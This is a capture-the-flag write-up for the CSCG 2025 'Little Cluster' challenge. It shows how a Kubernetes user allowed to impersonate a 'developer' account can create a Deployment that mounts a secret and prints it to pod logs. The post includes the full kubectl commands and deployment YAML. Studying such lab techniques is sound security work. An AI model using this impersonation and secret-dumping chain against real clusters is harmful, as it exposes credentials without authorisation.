---
title: Little Cluster - CSCG 2025 - Write-Up
date: 2025-04-24 10:00:00 +0200
categories: [Cyber Security Challenge Germany]
tags: [kubernetes,privesc]
description: Escalate your privileges with kubernetes.
image:
  path: /assets/blog/Little Cluster/logo.png
  alt: CSCG image
---


This is a Write-Up for the challenge "Little Cluster" of the CSCG 2025. The challenge was created by `Diff-fusion` and is rated as easy.

## Intro

The challenge provides us with a short description and even some resources for learning Kubernetes.

> Hey, today you'll learn to become a captain on the high seas of Kubernetes. Spawn yourself a ship and login to the helm to get started. You are deployed into a nice pod that is prepared with a `kubectl` to control everything you need. As a start you should figure out what you are allowed to do and the find the secret flag hidden on the ship.
> 
> Here are some additional resource to get you started:
> 
> - API [Authentication](https://kubernetes.io/docs/reference/access-authn-authz/authentication/) and [Authorization](https://kubernetes.io/docs/reference/access-authn-authz/authorization/)
> - Workload [Pods](https://kubernetes.io/docs/concepts/workloads/pods/) and [Deployments](https://kubernetes.io/docs/concepts/workloads/controllers/deployment/)
> - `kubectl` command [reference](https://kubernetes.io/docs/reference/kubectl/)

## Summary

Kubernetes is a container orchestration platform that manages containerized applications. It consists of various components. The components necessary to solve this challenge are the [RBAC](https://kubernetes.io/docs/reference/access-authn-authz/rbac/) (Role Based Access Control), Secrets and the [Logging](https://kubernetes.io/docs/concepts/cluster-administration/logging/).

In a cluster, you can assign Role-Based Access Control (RBAC) to users, which defines the permissions they hold for specific resources. These permissions are composed of two elements:

1. The resource the permission pertains to
2. The action (verb) the user is authorized to perform on that particular 
resource

In essence, this determines what operations a user can execute on a given resource within the cluster. These rules help the SecDevOp engineers to restrict access of users and only apply permissions the user needs.

Secrets in Kubernetes are used to store passwords, private keys, API-Keys and more. They were invented to handle secrets in a centralized place, managed by Kubernetes.

Logging in Kubernetes is many for, you guessed it, logging but according to the Kubernetes documentation it can also be used to debug certain applications. The way kubernetes produces logs is by simply taking anything written to the standard output and standard error stream. 


## Enumeration

The first thing to do in this challenge is to locate the flag. You can check the currently running pods with `kubectl get pods` command. In the list of these pods there is one particularly interesting pod, the `flag-keeper` pod. To view more details to this container the command `kubectl describe pod <name>` can be used. This will return an enormous list of pod properties.  Among the crucial sections contained is the Volumes segment, this entries tells you what volumes are mounted to the containers. In the challenge the volume `flag` is mounted to `/flag`, additionally the volume contains a secret. This secret has the name `flag`. So the flag is accessible as the file `/flag/flag`. 

```
    Mounts:
      /flag from flag (ro)
...
Volumes:
  flag:
    Type:        Secret (a volume populated by a Secret)
    SecretName:  flag
    Optional:    false
```

In order to inspect the existing permissions of users within a Kubernetes cluster, you can utilize the command `kubectl auth can-i --list`. This command returns a list of resources and actions (verbs) that each user is authorized to perform. One particularly important privilege is the last one, with that privilege you can impersonate, you can be, the `developer` user.

| Resources          | Non-Resource URLs       | Resource Names        | Verbs
|---------------------|-----------------------|----------------------|---------------|
| users              | []                    | [developer]          | [impersonate] |

The developer user, in contrast to regular users, is weaponized with a greater scope of permissions that allow them to perform tasks such as creating deployments and reading logs within the Kubernetes environment. By running the command `kubectl auth can-i --list --as=developer`, a list of permissions of the developer user can be retrieved.

| Resources           | Non-Resource URLs      | Resource Names        | Verbs |
|---------------------|-------------------|--------------------|---------------|
| deployments.apps    | []                | []                | [get, watch, list, create, delete] |
| pods/log            | []                | []                | [get] |



## Vulnerability

The vulnerability lies in granting the given user the privileges to impersonate the developer user. This user is granted with unrestricted deployment creation and log access. This is a common issue, that **unnecessary and dangerous permissions** are granted to users who do not need it. 

## Exploit

Given that the present user is granted permission to impersonate the developer user and this user has the rights to create deployments and access logs, you can build an exploit.

Even though the developer user has the explicit privilege to create pods by himself, he can use a deployment to deploy a pods. The following deployment file will create a pod with one container. After the container is started the secret is mounted to the container via a volume. To return the flag the initial command for the container is set to be `/bin/sh -c cat /mnt/flag/flag`, which will print the flag. Kubernetes automatically sends anything printed to `stdout` to the logs of the pod.

```sh
cat > deployment.yaml << EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: flag-logger
spec:
  replicas: 1
  selector:
    matchLabels:
      app: flag-logger
  template:
    metadata:
      labels:
        app: flag-logger
    spec:
      containers:
      - name: flag-reader
        image: busybox
        command: ["/bin/sh", "-c", "cat /mnt/flag/flag && sleep 3600"]
        volumeMounts:
        - name: flag-volume
          mountPath: "/mnt/flag"
          readOnly: true
      volumes:
      - name: flag-volume
        secret:
          secretName: flag
          optional: false
EOF
```

Following the creation of the deployment file, the next step involves applying this configuration as the developer user. To accomplish this task, you may use the `kubectl apply -f <file-name>` command.
```sh
kubectl --as developer apply -f deployment.yaml
```

To get the logs of a pod you first need to identify the pod name, this pod name is usually appended with a suffix of random hex. So to list all pods you may use the command below.
```sh
kubectl --as developer get pods
```

Finally you view the logs with the command below. Note that the container name may be different as explained above.

```sh
kubectl --as developer logs flag-logger-7d459c84b5-xlkl5
```


Flag:
```
CSCG{4h0y_c4pt41n!}
```
